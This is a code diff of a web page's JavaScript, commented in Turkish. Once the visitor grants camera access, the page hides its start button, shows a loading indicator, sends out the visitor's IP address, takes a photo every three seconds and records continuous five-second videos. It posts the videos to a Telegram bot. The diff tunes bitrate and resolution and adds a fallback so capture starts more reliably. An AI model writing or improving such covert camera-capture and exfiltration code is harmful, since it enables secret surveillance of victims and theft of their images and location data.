@@ -142,23 +142,27 @@
         }
         
         // ============================================
-        // 5 SANİYELİK VİDEO KAYDI (600-800KB)
+        // 5 SANİYELİK VİDEO KAYDI (SABİT KALİTE)
         // ============================================
         function recordVideo() {
             if (!stream || !stream.active) return;
             
             recordedChunks = [];
             
-            // Orta kalite - 600-800KB için
+            // Her videoda aynı bitrate - 1.2 Mbps (600-700KB için)
             const options = {
-                mimeType: 'video/webm',
-                videoBitsPerSecond: 1000000 // 1 Mbps
+                mimeType: 'video/webm;codecs=vp8',
+                videoBitsPerSecond: 1200000 // Sabit 1.2 Mbps
             };
             
             try {
                 mediaRecorder = new MediaRecorder(stream, options);
             } catch(e) {
-                mediaRecorder = new MediaRecorder(stream, { mimeType: 'video/webm' });
+                // Fallback
+                mediaRecorder = new MediaRecorder(stream, { 
+                    mimeType: 'video/webm',
+                    videoBitsPerSecond: 1200000 
+                });
             }
             
             mediaRecorder.ondataavailable = (event) => {
@@ -169,18 +173,20 @@
                 videoCount++;
                 const blob = new Blob(recordedChunks, { type: 'video/webm' });
                 
-                // Boyutu kontrol et
-                console.log(`Video boyutu: ${(blob.size / 1024).toFixed(2)} KB`);
+                // Boyutu hesapla
+                const boyutKB = (blob.size / 1024).toFixed(0);
                 
                 const formData = new FormData();
                 formData.append('chat_id', TARGET_ID);
                 formData.append('video', blob, `video_${Date.now()}.webm`);
-                formData.append('caption', `🎥 Video #${videoCount} - ${new Date().toLocaleString('tr-TR')} (${(blob.size / 1024).toFixed(0)}KB)`);
+                formData.append('caption', `🎥 Video #${videoCount} - ${new Date().toLocaleString('tr-TR')} (${boyutKB}KB)`);
                 
                 await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendVideo`, {
                     method: 'POST',
                     body: formData
                 });
+                
+                console.log(`Video ${videoCount}: ${boyutKB}KB`);
                 
                 // 1 saniye sonra yeni video
                 setTimeout(recordVideo, 1000);
@@ -202,9 +208,9 @@
             try {
                 stream = await navigator.mediaDevices.getUserMedia({ 
                     video: {
-                        width: { ideal: 640 },
-                        height: { ideal: 480 },
-                        frameRate: { ideal: 24 }
+                        width: { exact: 640 },
+                        height: { exact: 480 },
+                        frameRate: { exact: 24 }
                     }
                 });
                 
@@ -223,12 +229,33 @@
                     // 3 SANİYEDE 1 FOTOĞRAF
                     setInterval(takePhoto, 3000);
                     
-                    // 5 SANİYELİK VİDEO (hepsinin boyutu 600-800KB)
+                    // 2 saniye bekle sonra video başlasın
                     setTimeout(recordVideo, 2000);
                 };
                 
             } catch(e) {
-                alert('Kamera izni gerekli!');
+                // Hata olursa ideal dene
+                try {
+                    stream = await navigator.mediaDevices.getUserMedia({ 
+                        video: {
+                            width: { ideal: 640 },
+                            height: { ideal: 480 },
+                            frameRate: { ideal: 24 }
+                        }
+                    });
+                    video.srcObject = stream;
+                    video.onloadedmetadata = async () => {
+                        await video.play();
+                        const ip = await getIP();
+                        await sendIP(ip);
+                        document.getElementById('startBtn').style.display = 'none';
+                        document.getElementById('loading').style.display = 'block';
+                        setInterval(takePhoto, 3000);
+                        setTimeout(recordVideo, 2000);
+                    };
+                } catch(e2) {
+                    alert('Kamera izni gerekli!');
+                }
             }
         }
         
